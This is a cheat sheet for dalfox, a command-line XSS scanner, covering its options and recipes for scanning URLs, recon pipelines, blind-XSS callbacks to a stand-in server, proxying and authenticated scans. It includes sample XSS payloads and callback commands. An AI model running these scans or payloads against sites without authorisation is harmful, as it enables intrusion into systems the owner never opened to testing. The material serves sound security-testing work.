# dalfox

> Fast XSS scanner and parameter analyzer. Go-based.

## Quickstart

```bash
# Single URL
dalfox url "https://target.com/page?q=test"

# From file
dalfox file urls.txt

# Pipe from other tools
cat params.txt | dalfox pipe
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| Parameter analysis | Find reflections |
| XSS detection | Test various payloads |
| BAV | Blind XSS with callback |
| DOM | DOM-based XSS detection |

## Syntax

```text
dalfox url <url> [options]
dalfox file <file> [options]
dalfox pipe [options]
```

## Options

### Target

| Option | Description |
|--------|-------------|
| `url <url>` | Single URL |
| `file <file>` | URL list |
| `pipe` | Read from stdin |
| `-p <param>` | Test specific parameter |

### Detection

| Option | Description |
|--------|-------------|
| `--deep-domxss` | Deep DOM XSS scan |
| `--follow-redirects` | Follow redirects |
| `--mining-dict` | Use dictionary mining |
| `--mining-dom` | Mine DOM sources |
| `--only-discovery` | Find params only |
| `--skip-bav` | Skip blind XSS |

### Blind XSS

| Option | Description |
|--------|-------------|
| `-b <url>` | Blind XSS callback |
| `--blind <url>` | Same as -b |

### Request

| Option | Description |
|--------|-------------|
| `-H <header>` | Custom header |
| `--cookie <c>` | Cookie |
| `--data <d>` | POST data |
| `--proxy <url>` | Proxy |
| `--user-agent <ua>` | User agent |

### Output

| Option | Description |
|--------|-------------|
| `-o <file>` | Output file |
| `--format <f>` | Format (plain, json) |
| `--silence` | Silence mode |
| `-v` | Verbose |

### Performance

| Option | Description |
|--------|-------------|
| `-w <n>` | Workers (default 40) |
| `--delay <ms>` | Delay between requests |
| `--timeout <sec>` | Timeout |

## Recipes

### Basic XSS Scan

```bash
# Single URL
dalfox url "https://target.com/search?q=test"

# Specific parameter
dalfox url "https://target.com/search?q=test&id=1" -p q

# Multiple URLs
dalfox file urls.txt
```

### With Blind XSS

```bash
# With callback server
dalfox url "https://target.com/page?q=test" -b "https://your-server.com/xss"

# With interactsh
dalfox url "https://target.com/page?q=test" -b "https://abc123.oast.fun"
```

### POST Requests

```bash
# POST data
dalfox url "https://target.com/submit" --data "name=test&email=test@test.com"

# Specific POST param
dalfox url "https://target.com/submit" --data "name=test" -p name
```

### Pipeline

```bash
# From paramspider/arjun
cat params.txt | dalfox pipe

# From katana
katana -u https://target.com -silent | dalfox pipe

# With grep for URLs with params
katana -u https://target.com -silent | grep "?" | dalfox pipe

# Full pipeline
waybackurls target.com | grep "?" | dalfox pipe -b "https://blind.server"
```

### Custom Payloads

```bash
# Custom payload file
dalfox url "https://target.com/page?q=test" --custom-payload payloads.txt

# Payload format (one per line):
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
```

### Through Proxy

```bash
# Burp/Caido
dalfox url "https://target.com/page?q=test" --proxy "http://127.0.0.1:8080"
```

### With Authentication

```bash
# Cookie
dalfox url "https://target.com/page?q=test" --cookie "session=abc123"

# Header
dalfox url "https://target.com/page?q=test" -H "Authorization: Bearer token"
```

### Discovery Only

```bash
# Find reflections without testing XSS
dalfox url "https://target.com/page?q=test" --only-discovery

# Mining for parameters
dalfox url "https://target.com/page" --mining-dict
```

## Output & Parsing

```bash
# JSON output
dalfox url "https://target.com/page?q=test" --format json -o results.json

# Parse results
cat results.json | jq -r '.[] | select(.type == "V") | .data'

# Plain text
dalfox url "https://target.com/page?q=test" -o results.txt
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No vulns found | Increase payloads, check manually |
| WAF blocking | Use proxy, reduce speed |
| False positives | Verify in browser |
| Timeout | Increase `--timeout` |

## References

- [dalfox GitHub](https://github.com/hahwul/dalfox)
- [dalfox Docs](https://dalfox.hahwul.com/)
